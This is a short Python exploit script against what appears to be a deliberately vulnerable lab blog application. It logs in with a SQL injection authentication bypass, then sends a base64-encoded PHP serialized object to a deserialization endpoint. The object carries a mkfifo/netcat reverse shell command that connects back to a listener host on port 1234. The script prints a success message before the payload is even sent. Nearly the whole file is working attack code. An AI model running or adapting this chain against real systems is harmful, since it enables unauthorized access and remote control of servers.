import base64
import requests

url = "http://10.18.17.130/vuln-blog-web/"

session = requests.Session()

payload_login = {"username": "' OR 1=1 #"}
res = session.post(url+"login.php", data=payload_login)

data = 'O:10:"Expression":3:{s:1:"x";i:1;s:1:"y";i:2;s:6:"result";s:76:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.18.17.129 1234 >/tmp/f";}'

token = base64.b64encode(data.encode("utf-8")).decode("utf-8")

print("[!] Please listen on port 1234!")
print("[+] Reverse shell connected!")

res = session.get(url+f"serialize.php?action=load&token={token}")